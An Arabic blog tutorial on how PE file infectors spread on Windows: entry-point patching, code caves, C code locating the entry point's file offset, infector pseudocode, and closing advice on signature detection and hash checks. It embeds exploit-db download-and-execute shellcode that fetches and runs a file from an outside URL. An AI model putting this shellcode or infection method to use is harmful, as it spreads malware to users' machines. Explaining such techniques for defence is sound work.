---
layout: post
title:  "آلية عمل PE Infection"
date:   2018-08-12 04:51:01 -0700
comments: true
categories: Misc
---

توجد طرق إنتشار عديدة للبرمجيات الخبيثة عبر ثغرات الشبكات وغيرها. ولكن من الطرق المهمل ذكرها في المجتمع السيبراني العربي ما أكتب عنه هذا المقال. أتمنى أن يعود بفائدة للقارئ في حماية نفسه من مخاطر إنتشار البرمجيات الخبيثة.
طرق الحماية في نهاية المقال. 
كما سأشرح بإختصار آلية عملها للمهتمين فالأمن السايبراني.

## ماهي
عدوى الملفات التنفيذية أو PE Infection
هي من أقدم الطرق المستخدمة في نشر الملفات الخبيثة من باك دورز أو فايروسات وغيره في الجهاز. هي طريقة مستوحاة من الإلتهاب وكيفية إنتشاره لما يحيط به من خلايا الجسم. 
تكمن قوة الآلية في كونها تصيب أغلب الملفات التنفيذية في الجهاز المستهدف وبدوره يكون كل ملف مصاب وسيلة لنشر العدوى. فعند نقل أي ملف تنفيدي من جهاز مصاب لجهاز آخر ثم تنفيذه يعني ذلك إصابة جهاز جديد. 

تعمل الفكرة على أغلب الأنظمة المعروفة ولكن سأتطرق لعملها على نظام Windows فقط لفعاليتها العالية على هذا النظام تحديداً وفشلها لأسباب عدة فالأنظمة الإخرى سنتطرق لها لاحقاً.
كما تشير كلمة PE في العنوان إلى Portable Executabe وهي تركيبة الملفات التنفيذية المستخدمة في نظام Windows.

### كيفية عملها
![peinfc](/content/peinfc.jpg)

### مخاطرها
سرعة الإنتشار العالية. وعملها بصمت بحيث يعمل كل ملف في جهازك لصالح الإنتشار بدون علمك. كون الملفات تعمل بشكل طبيعي.
أيضا صعوبة التخلص منها. وسهولة مرورها على بعض الخبراء الأمنيين غير المطلعين على هذه الآلية. فيمكن أن يعتقد الخبير الأمني بأنه تخلص من كل أثر لأداة التجسس على سبيل المثال، دون أن يعلم بأنه بمجرد تنفيذه لملف آخر في جهازه سيقوم الملف بتحميل الأداة وتنفيذها مرة إخرى.


أما الآن فماهي تفاصيل الآلية. 
قبل أن أتطرق لكيفية التنفيذ لابد أن نعرف تركيبة الملفات التنفيذية وكيف تعمل لإستغلالها.


ملاحظة: لفهم الشرح بشكل أفضل يفضل أن تكون على علم بكيفية عمل الذاكرة والملفات   في الجهاز Virutal & Base Addressing


### كيف تعمل ملفات Windows التنفيذية (Exe 32-bit)
يتضمن عمل الملف التنفيذي الكثير من العمليات اللتي يطول شرحها لتهيئة النظام والملف للتنفيذ. ولكن مايهمنا هو نقطة بداية الملف أو مايسمى Entry point
وهو العنوان اللذي يبدأ النظام تنفيد أكواد الملف من عنده.

يتكون الملف التنفيذي كبقية الملفات من بايتات عبارة عن معلومات عن الملف والكود التنفيذي والبيانات من نصوص وغيرها.

تركيبة الملف التنفيذي:
![mzhead](/content/mzhead.jpg)

يهمنا PE Header أو NT Header وهو ستركتشر آخر يحتوى على معلومات مهمة لتنفيذ الآلية

مانبحث عنه هو نقطة الإدخال Entry Point
لأنه بتعديل تلك النقطة لعنوان آخر سيقوم النظام بتنفيد الملف من تلك النقطة
واللتي يمكننا إستغلالها بوضع كود خاص مهمته تحميل الملف وتنفيده. ثم ننفذ نقطة الإدخال السابقة قبل التعديل بعد تنفيذ مانريد فيعمل الملف بشكل طبيعي من نقطة الإدخال الإصلية.

يجب أيضآ أن لا ننسى الإحتفاظ بعنوان نقطة الإدخال السابق للعودة إليه لتنفيد الملف بشكل طبيعي
قبل تعديل الـ AddressOfEntryPoint لتشير للكود اللذي نريد تنفيذه فالملف


يمكننا الإطلاع على الستركتشرز من msdn
```c
    typedef struct _IMAGE_NT_HEADERS {
  DWORD                   Signature;
  IMAGE_FILE_HEADER       FileHeader;
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

نقطة الإدخال توجد في IMAGE_OPTIONAL_HEADER
```c
 typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
    ..
    ..
    ..
```


فعالية هذه الآلية في نظام وندوز تعتمد على وجود صلاحيات كتابة لباقي الملفات المجاورة. على عكس الأنظمة المتبقية التي تفشل فيها بسبب التشديد في صلاحيات فتح وقراءة وتعديل الملفات.
مثال على فتح ملف والحصول على موقع تعديل نقطة الإدخال وحفظ نقطة الإدخال القديمة 
```c
    LPCSTR fileName = "..";
    HANDLE hFile; 
    HANDLE hFileMapping;
    LPVOID lpFileBase;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS peHeader;
    PIMAGE_SECTION_HEADER sectionHeader;

    hFile = CreateFileA(fileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed\n");
        return;
    }
    
    hFileMapping = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,NULL);
    
    if(hFileMapping == 0) {
        printf("CreateFileMapping failed \n");
        CloseHandle(hFile);
        return;
    }
    
    lpFileBase = MapViewOfFile(hFileMapping,FILE_MAP_READ,0,0,0);
    
    if(lpFileBase == 0) {
        printf("MapViewOfFile failed \n");
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return;
    }
    
    dosHeader = (PIMAGE_DOS_HEADER) lpFileBase;
    
    if(dosHeader->e_magic==IMAGE_DOS_SIGNATURE) {
    
        peHeader = (PIMAGE_NT_HEADERS) ((u_char*)dosHeader+dosHeader->e_lfanew);
    
        if(peHeader->Signature==IMAGE_NT_SIGNATURE) {
    
            DWORD ep = peHeader->OptionalHeader.AddressOfEntryPoint;
            DWORD oldEp = ep + peHeader->OptionalHeader.ImageBase;
    
            sectionHeader = IMAGE_FIRST_SECTION(peHeader);
    
            UINT nSectionCount = peHeader->FileHeader.NumberOfSections;
            UINT i = 0;
            for( i = 0; i<=nSectionCount; ++i, ++sectionHeader )
            {
                if((sectionHeader->VirtualAddress) > ep) {
                    sectionHeader--;
                    break;
                }
            }
    
            if(i > nSectionCount)
            {
                sectionHeader = IMAGE_FIRST_SECTION(peHeader);
                UINT nSectionCount = peHeader->FileHeader.NumberOfSections;
                for(i = 0; i<nSectionCount-1; ++i,++sectionHeader);
            }
    
            DWORD retAddr = ep - (sectionHeader->VirtualAddress) + (sectionHeader->PointerToRawData);
            DWORD offsetToEdit = (DWORD)(retAddr+(PBYTE)lpFileBase);


        }
    }
    
    UnmapViewOfFile(lpFileBase);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
```


### Shell-code و CodeCave
ملاحظة: هذا الجزء يتطلب بعض المعرفة بلغة الاسمبلي وطريقة عمل المعالج

أما الآن وبعد أن أصبح بإمكاننا تعديل نقطة الإدخال وتوجيه الملف لأي نقطة نرغب أن يبدأ التنفيد من عندها لابد أيضا من أن نعدل على بايتات الملف ليحمل الكود اللذي نرغب بتنفيذه
وهو مايدعى بـ ShellCode
ولكن لايمكننا كتابته في مكان حيث يوجد بيانات فقد يقوم هذا بتدمير الملف وقد لايعمل بشكل طبيعي. أيضا لايمكننا كتابته فوق مكان يوجد فيه كود خاص بالملف الأصلي فقد يدمر ذلك عمل الملف. 
ومن هنا نخرج بمايسمى Code cave
وهي منطقة في كود الملف خالية من الاكواد أو ملية بأمر من لغة الاسمبلي وهو NOP
يقوم المعالج بالمرور فوقه بدون تنفيد أي أمر.
وغالبا مانجد في الملفات التنفيذية سلسلة من الإمر NOP متتالية يمكننا إستبدالها بالكود المراد. لكن يجب أن يكون الحجم مناسب لكتابة الشل كود
فقد تكون مجرد 3 NOPs متتالية
بمساحة مجموعها 12 بايت. وهي مساحة غير كافية لكتابة شل كود في الغالب

لذلك يجب على الملف الخبيث أن يكون قادر على البحث في الملفات عن CodeCave بمساحة كافية لكتابة الشل كود فيها ثم توجيه نقظة الإدخال للموقع الجديد اللذي يحتوي عليه.

أحد الأدوات التي يمكن أن يستعين بها الملف في هذه العملية
https://github.com/axcheron/pycave

أو يمكن للملف البحث عن عدد كافي من الـ NOPs

#### كتابة الشل كود
توجد بعض التحديات في كتابة الشيل كودز نظرآ للتغير العشوائي في الذاكرة
وإختلاف موقع الدوال من جهاز لآخر. أيضا اختلاف مساحة العناوين.

يوجد عدد كبير من الشل كودز والبايلودز الممكن إستخدامهم لأهداف متعددة أحدها إستخدام دالة الويندوزURLDownloadToFile لتحميل ملف وثم تنفيذه

أو يمكن أن تقوم بكتابة الشل كود الخاص بك بإستخدام الاسمبلي ثم إستخدام بايتاته وكتابتها في الـ Code cave

مثال:
https://www.exploit-db.com/exploits/24318/
```c
 unsigned char shellcode[] =
"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B"
"\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53"
"\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72"
"\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81"
"\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04"
"\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64"
"\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3"
"\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3"
"\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E"
"\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52"
"\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62"
"\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
"\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C"
"\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C"
"\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
"\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33"
"\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64"
"\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C"
"\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24"
"\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83"
"\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68"
"\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57"
"\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D"
"\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A"
"\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03"
"\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69"
"\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF"
"\xFF\xFF"
// http://bflow.security-portal.cz/down/xy.txt
"\x68\x74\x74\x70\x3A\x2F\x2F\x62"
"\x66\x6C\x6F\x77\x2E\x73\x65\x63\x75\x72"
"\x69\x74\x79\x2D\x70\x6F\x72\x74\x61\x6C"
"\x2E\x63\x7A\x2F\x64\x6F\x77\x6E\x2F\x78"
"\x79\x2E\x74\x78\x74\x00";
```




### الآلية بالكامل
```c
// البحث عن جميع الملفات في حلقة تكرار
{
    // فتح الملف وتخزين نقطة الإدخال القديمة والبحث عن Code Cave
        {
        // عند الحصول على مساحة كافية. كتابة الشل كود وحفظ عنوان بداية الشل كود
        // كتابة قفزة JMP لعنوان نقطة الإدخال الأصلي عن الإنتهاء من تنفيذ الشل كود 
        // تعديل نقطة الإدخال لعنوان الشل كود
        // حفظ تعديلات الملف
        // الملف التالي ...
    }
}

```




### طرق الحماية
* من أهم الطرق المتبعة مايسمى Pattern recognition
وهو تخزين الشل كود أو جزء منه. على سبيل المثال بايتات رابط الملف فالشل كود
ثم البحث في بايتات الملفات عنه. فعند وجوده يعني أن الملف مصاب ويمكن بسهولة علاجه بتعديل نقطة الإدخال وحذف الشل كود. وتطبيق هذه الطريقة على جميع الملفات 
إلا أنه يمكن تجاوز هذه الطريقة بإستخدام عدة تقنيات منها مايسمى polymorphic code وهي تقنية تقوم بإصدار كود مختلف في كل مرة ولكن يؤدي نفس العمل
أو بمجرد وضع بعض من العشوائية في الشل كود 

* File verification
من طرق الحماية الإخرى والتي يمكن إتباعها للحماية من عدة هجمات للتأكد من سلامة الملف.
عن طريق إصدار وإسم الملف يمكنك مقارنته مع الملف الرسمي بعدة طرق
أما رفع الملف في مواقع المقارنة وفحص الملفات لمقارنة الهاش الخاص بالملف 
أو عن طريق موجه أوامر وندوز بإستعمال الأمر
```c
    FC [pathname1] [pathname2]
```
فعند وجود إختلاف بالرغم من تطابق الإصدار والشركة والحجم فلابد من فحص الجهاز والملف للتأكد من سلامة جهازك.

